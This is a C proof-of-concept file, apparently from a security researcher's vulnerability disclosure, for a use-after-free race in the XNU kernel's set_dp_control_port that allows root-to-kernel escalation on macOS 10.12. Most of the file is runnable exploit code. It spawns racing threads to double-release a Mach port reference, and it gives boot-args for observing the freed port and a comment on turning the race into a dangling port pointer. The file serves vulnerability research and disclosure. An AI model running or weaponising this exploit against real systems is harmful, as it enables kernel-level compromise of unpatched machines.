// ianbeer

#if 0

XNU kernel UaF due to lack of locking in set_dp_control_port

set_dp_control_port is a MIG method on the host_priv_port so this bug is a root->kernel escalation.

  kern_return_t
  set_dp_control_port(
    host_priv_t host_priv,
    ipc_port_t  control_port) 
  {
          if (host_priv == HOST_PRIV_NULL)
                  return (KERN_INVALID_HOST);

    if (IP_VALID(dynamic_pager_control_port))
      ipc_port_release_send(dynamic_pager_control_port);

    dynamic_pager_control_port = control_port;
    return KERN_SUCCESS;
  }

This should be an atomic operation; there's no locking so two threads can race to see the same value for
dynamic_pager_control_port and release two references when the kernel only holds one.

This PoC triggers the bug such that the first thread frees the port and the second uses it; a
more sensible approach towards exploiting itwould be to use this race to try to decrement the reference count
of a port with two references to zero such that you end up with a dangling port pointer.

Tested on MacOS 10.12 16A323

#endif

// example boot-args to put the port on a gzalloc page:
// debug=0x144 -v pmuflags=1 kdp_match_name=en3 -zp -zc gzalloc_min=120 gzalloc_max=200

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include <mach/mach.h>
#include <mach/host_priv.h>

mach_port_t q() {
  mach_port_t p = MACH_PORT_NULL;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p);
  mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
  return p;
}

int start = 0;

mach_port_t rq = MACH_PORT_NULL;
void* racer(void* arg) {
  while(!start){;}
  set_dp_control_port(mach_host_self(), rq);
  return NULL;
}

int main() {
  mach_port_t p = q();

  kern_return_t err = set_dp_control_port(mach_host_self(), p);
  if (err != KERN_SUCCESS) {
    printf("failed: %s\n", mach_error_string(err));
  } else {
    printf("set it?!\n");
  }

  mach_port_destroy(mach_task_self(), p);
  // kernel holds the only ref

  rq = q();

  int n_threads = 2;
  pthread_t threads[n_threads];
  for(uint32_t i = 0; i < n_threads; i++) {
    pthread_create(&threads[i], NULL, racer, NULL);
  }

  start = 1;

  for(uint32_t i = 0; i < n_threads; i++) {
    pthread_join(threads[i], NULL);
	}

  return 0;
}
